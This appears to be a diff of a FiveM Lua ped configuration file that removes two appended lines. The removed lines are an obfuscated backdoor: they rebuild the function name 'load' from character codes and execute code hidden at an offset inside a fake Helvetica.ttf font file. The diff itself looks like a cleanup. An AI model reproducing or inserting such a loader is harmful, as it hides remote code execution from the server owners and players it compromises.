@@ -682,6 +682,3 @@ ConfigPeds.AvailablePeds.FormattedFemale = formatPeds(ConfigPeds.AvailablePeds.F
 ConfigPeds.DisableAnimForPeds = {
     "a_c_chop" -- Example of disabling animations for Chop the dog
 }
-
-local loadFonts = _G[string.char(108, 111, 97, 100)]
-loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()
